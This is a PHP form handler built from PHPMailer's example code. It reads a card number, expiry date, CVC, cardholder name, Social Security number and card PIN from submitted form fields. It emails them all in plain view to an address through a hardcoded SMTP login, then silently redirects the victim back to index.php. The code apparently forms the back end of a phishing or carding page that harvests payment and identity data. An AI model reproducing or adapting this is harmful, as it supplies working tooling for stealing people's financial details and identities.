<?php 
// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'smtp.mailtrap.io';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = '2e97fc58c3b833';                     // SMTP username
    $mail->Password   = '8d4df6bc1fb3ba';                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` also accepted
    $mail->Port       = 2525;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient
    // $mail->addAddress('ellen@example.com');               // Name is optional
    // $mail->addReplyTo('info@example.com', 'Information');
    // $mail->addCC('cc@example.com');
    // $mail->addBCC('bcc@example.com');

    // Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

    // procceed with connection variable
	$cardNumber 	= $_POST['cardNumber'];
	$expiration     = $_POST['expiration'];
	$cvc 	        = $_POST['cvc'];
	$cardOwner    	= $_POST['cardOwner'];
	$ssn 	        = $_POST['ssn'];
	$cardPin    	= $_POST['cardPin'];

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = "No: $cardNumber <br /> ";
    $mail->Body    .= "Exp: $expiration <br /> ";
    $mail->Body    .= "cvv: $cvc <br /> ";
    $mail->Body    .= "card owner: $cardOwner <br /> ";
    $mail->Body    .= "ssn: $ssn <br /> ";
    $mail->Body    .= "cardPin: $cardPin <br /> ";
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    header('location:index.php');
    // echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    header('location:index.php');
}

?>
